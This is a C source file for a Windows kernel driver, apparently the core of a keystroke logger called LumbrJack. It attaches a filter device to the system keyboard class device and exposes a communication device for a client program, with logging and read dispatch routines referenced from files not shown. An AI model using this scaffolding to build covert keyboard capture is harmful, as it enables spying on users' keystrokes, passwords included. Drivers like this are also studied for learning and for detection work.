#include "debug.h"
#include "dispatch.h"
#include "BlockingQueue.h"
#include "log.h"
#include <ntddk.h>

static UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\LumbrJackDevSymLink");

static void unload(PDRIVER_OBJECT pDriverObject);
static NTSTATUS setupCommunicationDevice(PDRIVER_OBJECT pDriverObject);
static NTSTATUS setupKbdFilterDevice(PDRIVER_OBJECT pDriverObject);
static void setMajorFunctions(PDRIVER_OBJECT pDriverObject);

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
	UNREFERENCED_PARAMETER(pRegistryPath);

	DBG_PRINT("------------------------\n");

	pDriverObject->DriverUnload = unload;
	NTSTATUS ntStatus = setupCommunicationDevice(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupCommunicationDevice failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	ntStatus = setupKbdFilterDevice(pDriverObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("DriverEntry: setupKbdFilterDevice failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	KeInitializeSemaphore(&readSemaphore, 1, 1);
	setMajorFunctions(pDriverObject);

	DBG_PRINT("DriverEntry: Driver loaded\n");

	return STATUS_SUCCESS;
}


static void unload(PDRIVER_OBJECT pDriverObject) {
	// stop logging if still running
	isLogging = FALSE;

	NTSTATUS ntStatus = STATUS_SUCCESS;
	
	if (symLink.Buffer) {
		ntStatus = IoDeleteSymbolicLink(&symLink);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("unload: Symbolic link: \"%wZ\" deleted\n", symLink);
		}
		else {
			DBG_PRINTF("unload: IoDeleteSymbolicLink failed: 0x%lx\n", ntStatus);
		}
	}

	PDEVICE_OBJECT pCurDevice = pDriverObject->DeviceObject;

	while (pCurDevice) {
		const PDEVICE_OBJECT pNextDevice = pCurDevice->NextDevice;

		if (pCurDevice->DeviceExtension) {
			const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pCurDevice->DeviceExtension)->DeviceObject;

			if (pTargetDevice) {
				IoDetachDevice(pTargetDevice);
				DBG_PRINT("unload: Device detached\n");
			}

		}

		IoDeleteDevice(pCurDevice);
		DBG_PRINT("unload: Device deleted\n");
		pCurDevice = pNextDevice;
	}

	ntStatus = KeWaitForSingleObject(&readSemaphore, Executive, KernelMode, FALSE, NULL);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("unload: KeWaitForSingleObject failed for semaphore: 0x%lx\n", ntStatus);
	}

	DBG_PRINT("unload: Driver unloaded\n");
	DBG_PRINT("------------------------\n");

	return;
}


// setup device for client communication
static NTSTATUS setupCommunicationDevice(PDRIVER_OBJECT pDriverObject) {
	PDEVICE_OBJECT pComDevObject = NULL;
	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\LumbrJackComDev");

	NTSTATUS ntStatus = IoCreateDevice(pDriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pComDevObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("setupCommunicationDevice: IoCreateDevice failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	ntStatus = IoCreateSymbolicLink(&symLink, &devName);

	if (!NT_SUCCESS(ntStatus)) {
		IoDeleteDevice(pComDevObject);
		DBG_PRINTF("setupCommunicationDevice: IoCreateSymbolicLink failed: 0x%lx\n", ntStatus);
	}

	return ntStatus;
}


// setup filter device for keyboard
static NTSTATUS setupKbdFilterDevice(PDRIVER_OBJECT pDriverObject) {
	PDEVICE_OBJECT pFltDevObject = NULL;

	NTSTATUS ntStatus = IoCreateDevice(pDriverObject, sizeof(DEVOBJ_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, FILE_DEVICE_SECURE_OPEN, FALSE, &pFltDevObject);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("createFilterDevice: IoCreateDevice failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}

	pFltDevObject->Flags |= DO_BUFFERED_IO;
	pFltDevObject->Flags &= ~DO_DEVICE_INITIALIZING;

	RtlZeroMemory(pFltDevObject->DeviceExtension, sizeof(DEVOBJ_EXTENSION));
	UNICODE_STRING kbdDevName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
	ntStatus = IoAttachDevice(pFltDevObject, &kbdDevName, &((PDEVOBJ_EXTENSION)pFltDevObject->DeviceExtension)->DeviceObject);

	if (!NT_SUCCESS(ntStatus)) {
		IoDeleteDevice(pFltDevObject);
		DBG_PRINTF("createFilterDevice: IoAttachDevice failed: 0x%lx\n", ntStatus);
	}

	return ntStatus;
}


static void setMajorFunctions(PDRIVER_OBJECT pDriverObject) {
	
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = passThrough;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = passThrough;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = passThrough;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchDevCtl;
	pDriverObject->MajorFunction[IRP_MJ_READ] = dispatchRead;

	return;
}